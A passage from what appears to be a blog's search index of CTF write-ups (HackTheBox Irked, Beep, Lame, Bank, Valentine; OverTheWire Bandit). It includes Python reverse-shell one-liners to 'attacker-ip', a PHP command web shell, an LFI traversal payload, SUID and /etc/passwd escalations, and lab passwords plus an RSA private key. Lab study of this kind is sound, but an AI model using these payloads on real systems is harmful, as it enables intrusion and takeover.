webpage.Let’s use steghide and try to extract data from irked.jpg .steghide extract -sf irked.jpgwe got another password. It’s not a base64 string because of :.Let’s try this password for djmardov account.we got a user flag.How exploit worksthis specific version 3.2.8.1 is contain backdoor . this backdoor is used by attacker to execute any cmd on system.vuln backdoor code : #ifdef DEBUGMODE3 if (!memcmp(readbuf, DEBUGMODE3_INFO, 2)) DEBUG3_LOG(readbuf); #endifit looks like some debug statement. DEBUG3_LOG is call to system() and DEBUGMOD3_INFO is just string AB . so if we send any cmd after AB it directly send to system() .Getting rootafter bit enumeration we found suspicious SUID /usr/bin/viewuserwhen we run binary it tries to execute listusers in tmp directory. but the file is not present.we can create a file named listusers and add a simple bash script to get shell.give execution permission to file. chmod +x listusersby running /usr/bin/viewuser we get the root shell." }, { "title": "Beep", "url": "/posts/Beep/", "categories": "CTF, hackthebox", "tags": "lfi, sudo", "date": "2020-12-05 00:06:06 +0530", "snippet": "beep is an easy box that has 20 points. box has a lfi vulnerability which gives us creds to login. then we use file upload vuln to get a shell. privs is done by using sudo.Enumerationas always we start with NmapStarting Nmap 7.80 ( https://nmap.org ) at 2020-12-03 08:13 ESTNmap scan report for 10.10.10.7Host is up (0.62s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 4.3 (protocol 2.0)| ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)|_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)25/tcp open smtp Postfix smtpd|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 80/tcp open http Apache httpd 2.2.3|_http-server-header: Apache/2.2.3 (CentOS)|_http-title: Did not follow redirect to https://10.10.10.7/|_https-redirect: ERROR: Script execution failed (use -d to debug)110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4|_pop3-capabilities: RESP-CODES USER UIDL LOGIN-DELAY(0) APOP IMPLEMENTATION(Cyrus POP3 server v2) EXPIRE(NEVER) AUTH-RESP-CODE PIPELINING STLS TOP111/tcp open rpcbind 2 (RPC #100000)143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4443/tcp open ssl/https?|_ssl-date: 2020-12-03T14:18:21+00:00; +1h01m04s from scanner time.878/tcp open status 1 (RPC #100024)993/tcp open ssl/imap Cyrus imapd|_imap-capabilities: CAPABILITY995/tcp open pop3 Cyrus pop3d3306/tcp open mysql MySQL (unauthorized)4190/tcp open sieve Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)4445/tcp open upnotifyp?4559/tcp open hylafax HylaFAX 4.3.1010000/tcp open http MiniServ 1.570 (Webmin httpd)|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: Hosts: beep.localdomain, 127.0.0.1, example.com, localhost; OS: UnixHost script results:|_clock-skew: 1h01m03sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 377.37 secondsNmap shows various services are open. Let’s start with the webpage.there is an Elastix login page.tried some default password like elastix:elastix admin:admin , admin:password, admin:elastix but none of them are corrected. also tried to sqli but it’s not vulnerable.Let’s continue our enumeration with directory scanning.use ffuf to brute-force found one directory vtigercrm . which have another login page.also webmin is hosted on port 10000Let’s search for an exploit for Elastix and webmin.Local file inclusion in elastix looks interesting let’s try this.so we get lfi by using ` /vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&amp;amp;module=Accounts&amp;amp;action`by using payload we got /etc/passwd file.next we try to find password in conf file.Elastix store its password in /etc/elastix.conf file.Gaining shellwe got creds for admin, Cyrus, and the MySQL root user.tried these creds to login to MySQL but it doesn’t allow my IP to connect to mysql server.I also tried ssh using creds but it failed.next, I tried creds on Elastix,Webmin, and vtiger. it works on Elastix and vtiger cms.I tried to get a reverse shell from elastix but I cant find any way to upload shell.so I move on vtiger .after some enumaration i found that we can upload logo image in admin &amp;gt;&amp;gt; settings &amp;gt;&amp;gt; Company Details .lets craft php reverse shell.create php cmd execution payload’&amp;lt;?php system($_GET[&quot;cmd&quot;]); ?&amp;gt; and upload it .view source code to find out where the is file uploaded.navigate that file and now I can execute cmd.using python got revershell on the box.python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attacker-ip&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;there are two user fenis and spamfilter . in fenis home directory we got user.txtGetting rootroot privs is easy on this box. we can run a bunch of programs as root.l use Nmap to get root shell." }, { "title": "Lame", "url": "/posts/Lame/", "categories": "CTF, hackthebox", "tags": "ftp, smb", "date": "2020-12-04 13:49:49 +0530", "snippet": "lame is an easy box and one of the earliest boxes. and with Metasploit, we can root the box.Enumerationas always we start the box with a Nmap scan.Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-30 02:48 ESTNmap scan report for 10.10.10.3Host is up (0.36s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status:| Connected to 10.10.14.7| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| vsFTPd 2.3.4 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)|_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 2h31m25s, deviation: 3h32m08s, median: 1m24s| smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian)| Computer name: lame| NetBIOS computer name: | Domain name: hackthebox.gr| FQDN: lame.hackthebox.gr|_ System time: 2020-11-30T02:50:16-05:00| smb-security-mode: | account_used: &amp;lt;blank&amp;gt;| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_smb2-time: Protocol negotiation failed (SMB2)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 54.11 secondsNmap shows that FTP, ssh, and samba services are open on the box.by viewing to FTP version I know that box is vulnerable to FTP backdoor cmd execution. samba is also run on an older version, there should be a vulnerability for that version.FTPLet’s start with FTP. we can log in into FTP using anonymous as user and pass. but nothing interested found in FTP.lets search exploit for vsftpd 2.3.4 .this is a Metasploit script so let’s fire up MSF and try this one.this exploit is failed, don’t know why, we will see when we get into the box. lets move on to next service.SMBwe have samba service lets enumerate it. first, we try to find out share on smb.smbclient -L //10.10.10.3we got /tmp and /opt share. tried to access opt but it needs a password.but we can access tmp share. nothing seems to be interested in this share. Let’s check the exploit for smb version. after a bit of search, I found an exploit.usermap exploitthere is also a Metasploit script for this exploit. Let’s try out that.Getting rootby using the usermap script exploit we get a root shell on the box.Let’s see how this exploit works by viewing source code.when we send a username with shell meta character we get arbitrary cmd injection this means we can craft and after nohup we can add our reverse shell code to get shell." }, { "title": "bank", "url": "/posts/bank/", "categories": "CTF, hackthebox", "tags": "file upload, dns, passwd", "date": "2020-12-03 14:05:05 +0530", "snippet": "bank is an easy box in which we have to do some domain enumeration to find website hosted on box. bypass file upload restriction to get a shell on box. privs escalation is easy we have to just modify a file.EnumerationSo let’s dive in, as always we start with a Nmap scan.Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-04 01:10 ESTNmap scan report for 10.10.10.29Host is up (0.26s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)| 2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)| 256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)|_ 256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu80/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 17.98 secondsNmap shows that we have ssh, DNS, and webpage on the box. Let’s start to enumerate the webpage.the webpage shows the default apache HTTP page. also, run gobuster but nothing interested found.there is port 53 open so let’s check for zone transfer. there is no hint about host or domain lets try bank.htb.we found chris.bank.htb bank.htb ns.bank.htb www.bank.htb . add them in /etc/hosts file.chris.bank.htb ns.bank.htb and www.bank.htb redirected to default apache page. only bank.htb redirected to login page.try to some default creds like admin:admin , admin:password, admin:bank, bank:bank but none of this work, also test for sqli but does not found sqli vulnerability.Let’s find out what directories are present using ffuf.uploads return 403 forbidden, assets doesn’t seem too interesting, inc has four PHP pages it also doesn’t seem interesting.balance-transfer has a lot of .acc files which having encrypted username and password. but one file looks interesting because it has less size compare to all other files. and when I open it it has a plain text username and password for Chris.--ERR ENCRYPT FAILED+=================+| HTB Bank Report |+=================+===UserAccount===Full Name: Christos ChristopoulosEmail: chris@bank.htbPassword: !##HTBB4nkP4ssw0rd!##CreditCards: 5Transactions: 39Balance: 8842803 .===UserAccount===Gaining shellusing these creds log in to Chris’s account. there is support.php which is tickets system and we can uploads files. try to upload PHP shell but it gives us an error that only image files can be uploaded. so I craft a file that has png mime type and PHP shell content and uploads it.it accepts the file but the webserver does not treat it as a PHP file because of .png extension.here I stuck for a while but after viewing the source code of the support.php i found that it can accept .htb extension which executes as PHP code so create a new payload with .htb and upload it.&amp;lt;!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --&amp;gt;access the web shell in bank.htb/uploads/test.htbgot web-shell as www-dataused python to get reverse shell.python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attacker-ip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;in chris’s home directory found a user flag.Getting rootwhile enumerating box for privs I found that we can write into /etc/passwd file. so it’s easy to get root on the box. just create another user with root privs and got root access." }, { "title": "bandit", "url": "/posts/bandit/", "categories": "CTF, wargame", "tags": "linux", "date": "2020-12-02 20:35:00 +0530", "snippet": "ssh in : bandit.labs.overthewire.org port 2220level 0 :user : bandit0pass : bandit0level 1 :pass is stored in readme.use cat to get passwordboJ9jbbUNNfktd78OOpsqOltutMc3MY1level 2 :The password for the next level is stored in a file called - located in the home directorycat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9level 3 :The password for the next level is stored in a file called spaces in this filename located in the home directorycat spaces\\ in\\ this\\ filenameUmHadQclWmgdLOKQ3YNgjWxGoRMb5luKlevel 4 :The password for the next level is stored in a hidden file in the inhere directory.ls -lacat .hiddenpIwrPrtPN36QITSp3EQaw936yaFoFgABlevel 5 :The password for the next level is stored in the only human-readable file in the inhere directory. find . -type f xargs file grep text koReBOKuIDDepwhWk7jZC0RTdopnAYKhlevel 6 :The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:human-readable1033 bytes in sizenot executablefind . -size 1033c ! -executableDXjZPULLxYr17uwoI01bNLQbtFemEgo7level 7 :The password for the next level is stored somewhere on the server and has all of the following properties:owned by user bandit7owned by group bandit633 bytes in sizefind / -type f -user bandit7 -group bandit6 -size 33c 2&amp;gt;/dev/nullHKBPTKQnIay4Fw76bEy8PVxKEDQRKTzslevel 8 :The password for the next level is stored in the file data.txt next to the word millionth cat data.txt grep millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plVlevel 9 :The password for the next level is stored in the file data.txt and is the only line of text that occurs only oncesort data.txt | uniq -u UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhRlevel 10 :The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.` strings data.txt` truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLklevel 11 :The password for the next level is stored in the file data.txt, which contains base64 encoded datacat data.txt | base64 -d IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPRlevel 12 :The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positionsused online decrypter 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUulevel 13 :The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)xxd -r password_backup &amp;gt; newfile used to put hexdemp to its original binary format (which is bzip2) .after umcompress ton of file get password 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYLlevel 14 :The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working onin bandit13 homepage there is private ssh key for bandit14. using that key login into bandit14.ssh bandit14@localhost -i sshkey.privatelevel 15 :The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.by privious challenge we know that bandit14 pass is stored in /etc/bandit_pass/bandit14. bandit14 : 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3econnect to port 30000 using netcatnc localhost 300004wcYUJFw0k0XLShlDzztnTBHiqxU3b3e //enter bandit14 passwordCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNr // got bandit15 password. BfMYroe26WYalil77FoDi9qh59eK5xNrlevel 16 :The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.use openssl to establish the connection.openssl s_client -connect localhost:30001BfMYroe26WYalil77FoDi9qh59eK5xNr //entered bandit15 password.Correct!cluFn7wTiGryunymYOu4RcffSxQluehd // got bandit16 password cluFn7wTiGryunymYOu4RcffSxQluehdlevel 17 :The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.scan with nmap.Starting Nmap 7.40 ( https://nmap.org ) at 2020-12-23 14:09 CET Nmap scan report for localhost (127.0.0.1) Host is up (0.00032s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 31046/tcp open echo 31518/tcp open ssl/echo | ssl-cert: Subject: commonName=localhost | Subject Alternative Name: DNS:localhost | Not valid before: 2020-11-04T15:24:27 |_Not valid after: 2021-11-04T15:24:27 |_ssl-date: TLS randomness does not represent time 31691/tcp open echo 31790/tcp open ssl/unknown | fingerprint-strings: | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq: |_ Wrong! Please enter the correct current password | ssl-cert: Subject: commonName=localhost | Subject Alternative Name: DNS:localhost | Not valid before: 2020-12-03T12:25:02 |_Not valid after: 2021-12-03T12:25:02 |_ssl-date: TLS randomness does not represent time 31960/tcp open echo 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port31790-TCP:V=7.40%T=SSL%I=7%D=12/23%Time=5FE341A4%P=x86_64-pc-linux- SF:gnu%r(GenericLines,31,&quot;Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20c SF:urrent\\x20password\\n&quot;)%r(GetRequest,31,&quot;Wrong!\\x20Please\\x20enter\\x20th SF:e\\x20correct\\x20current\\x20password\\n&quot;)%r(HTTPOptions,31,&quot;Wrong!\\x20Ple SF:ase\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n&quot;)%r(RTSPRequest SF:,31,&quot;Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password SF:\\n&quot;)%r(Help,31,&quot;Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\ SF:x20password\\n&quot;)%r(SSLSessionReq,31,&quot;Wrong!\\x20Please\\x20enter\\x20the\\x2 SF:0correct\\x20current\\x20password\\n&quot;)%r(TLSSessionReq,31,&quot;Wrong!\\x20Pleas SF:e\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n&quot;)%r(Kerberos,31,&quot; SF:Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n&quot;)% SF:r(FourOhFourRequest,31,&quot;Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20 SF:current\\x20password\\n&quot;)%r(LPDString,31,&quot;Wrong!\\x20Please\\x20enter\\x20th SF:e\\x20correct\\x20current\\x20password\\n&quot;)%r(LDAPSearchReq,31,&quot;Wrong!\\x20P SF:lease\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n&quot;)%r(SIPOption SF:s,31,&quot;Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20passwor SF:d\\n&quot;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 89.10 secondsnmap show that only port 31518 and 31790 has ssl encryption.use openssl to check connection.port 31518 send back whatever we send. port 31790 give us ssh private key for nex level.openssl s_client -connect localhost:31790-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----level 18There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.newwe use diff cmd which compare files line by line and show differen line in both files.diff password.new password.old kfBf3eYk5BPBRzwjqutbbfE887SVc5Ydlevel 19The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.we can’t log in using password. but we can execute cmd using ssh.bandit18@bandit.labs.overthewire.org -p 2220 cat /home/bandit18/readme IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5xlevel 20To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.in home dir we got bandit20-do suid.suid bit is used to run cmd as other user.here we can run cmd as bandit20./badnit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0jlevel 21There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).the suconnect is setuid binary. which run as other user. here we can run it as bandit21. this binary connect with given port and read for bandit20 password. then it see if input password and bandit20 password is match or not. if matches it send us bandit21 password.so here we first start TCP server on port 1337.echo &quot;GbKksEFF4yrVs6il55v6gwY5aVje5f0j&quot; | nc -l localhost -p 1337 &amp;amp;it will run in background.next we establish connection using suconnect ./suconnect 1337it will connect to port 1337 and read bandit20 password. then it matches that with bandit20 password if correct then it give us bandit21 password. gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGrlevel 22A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.here are some cron jobs running. lets take look at it.first we list out cronjobs in /etc/cron.d/bandit21@bandit:/etc/cron.d$ ls -latotal 36drwxr-xr-x 2 root root 4096 Jul 11 15:56 .drwxr-xr-x 87 root root 4096 May 14 2020 ..-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit15_root-rw-r--r-- 1 root root 62 Jul 11 15:56 cronjob_bandit17_root-rw-r--r-- 1 root root 120 May 7 2020 cronjob_bandit22-rw-r--r-- 1 root root 122 May 7 2020 cronjob_bandit23-rw-r--r-- 1 root root 120 May 14 2020 cronjob_bandit24-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit25_root-rw-r--r-- 1 root root 102 Oct 7 2017 .placeholderwe interested in bandit22 password. so lets take look at bandit22 cronjob.bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/nullcronjob is running /usr/bin/cronjob_bandit22.sh script for every minute.lets take look at cronjob_bandit22.shbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &amp;gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvthis script read password from /etc/bandit_pass/bandit22 and save to file t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv in /tmp directory.we can get password.cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Yk7owGAcWjwMVRwrTesJEwB7WVOiILLIlevel 23A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.first we analyze the cronjob.bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23@reboot bandit23 /usr/bin/cronjob_bandit23.sh &amp;amp;&amp;gt; /dev/null* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;amp;&amp;gt; /dev/nullthis cronjob run /usr/bin/cronjob_bandit23.sh for every minute.when we cat cronjob_bandit23.sh script.#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d &#39; &#39; -f 1)echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;cat /etc/bandit_pass/$myname &amp;gt; /tmp/$mytargeton first line it run whoami cmd and assign output to myname variable.next it define another mytarget variable. and asign to output ofecho I am user $myname | md5sum | cut -d &#39; &#39; -f 1so basically it convert “I am user bandit22” to md5 hash. and cut use to get first part of md5hash.cut is used to extract data. here it extract first field.when we locally run this cmd we get $mytargetbandit22@bandit:/etc/cron.d$ echo &quot;I am user bandit23&quot; | md5sum | cut -d &#39; &#39; -f 18ca319486bfbbc3663ea0fbe81326349and in /tmp/8ca319486bfbbc3663ea0fbe81326349 we have our password.bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n jc1udXuA1tiHqjIsL8yaapX5XIAI6i0nlevel 24A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.first we see cronjob.bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&amp;gt; /dev/null* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&amp;gt; /dev/nullit runs script /usr/bin/cronjob_bandit24.sh for every one minutes.Lets take look at script.#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;for i in * .*;do if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ]; then echo &quot;Handling $i&quot; owner=&quot;$(stat --format &quot;%U&quot; ./$i)&quot; if [ &quot;${owner}&quot; = &quot;bandit23&quot; ]; then timeout -s 9 60 ./$i fi rm -f ./$i fidonemyname=$(whoami)cd /var/spool/$mynamerun whoami cmd and output asign to myname variable. then it change the directory to /var/spool/bandit24.for i in * .*;do if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ]; then echo &quot;Handling $i&quot; owner=&quot;$(stat --format &quot;%U&quot; ./$i)&quot; if [ &quot;${owner}&quot; = &quot;bandit23&quot; ]; then timeout -s 9 60 ./$i fi rm -f ./$i fidonenext it run for loop for each file in /var/spool/bandit24first it exclude . and .. from /var/spool/bandit24.then it echo handling filenamenext it checks for owner of file and if owner of file is bandit23 it run that script for 60 seconds and then kill it. (9 is for SIGKILL)timeout : allows you to run a command with a time limit.and lastly it remove script from directory.Now we have write permisson on /var/spool/bandit24 so we can create script which give us password of bandit24 and place it in /var/spool/bandit24.script#!/bin/bashcat /etc/bandit_pass/bandit24 &amp;gt; /tmp/passfilesave this file as new.sh to /var/spool/bandit24 and give excute permission.chmod 777 new.shcreate file in tmp dir : passfiletouch /tmp/passfile give it permission to write anyone.chmod 777 /tmp/passfile wait for one minut and we get bandit24 password in /tmp/passfilebandit23@bandit:/etc/cron.d$ cat /tmp/passfileUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZlevel 25A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.To solve this challenge we write a script that connect to port 30002 and enter bandit25 password and pincode.nc localhost 30002 &amp;lt;&amp;lt;&amp;lt; $(for a in $(seq 0000 9999);do echo “UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $a”;done)first we run for loop for 0000 to 9999 and for each iteration we test pincode. uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG" }, { "title": "Valentine", "url": "/posts/valentine/", "categories": "CTF, hackthebox", "tags": "heartbleed, tmux", "date": "2020-12-01 11:46:46 +0530", "snippet": "valentine is an easy box that has heartbleed vulnerability, heartbleed give us a passphrase for ssh key. privs is done by manipulating tmux sessions.Enumerationas always we start with Nmap scanStarting Nmap 7.80 ( https://nmap.org ) at 2020-12-04 08:46 ESTNmap scan report for valentine.htb (10.10.10.79)Host is up (0.22s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)|_ 256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)80/tcp open http Apache httpd 2.2.22 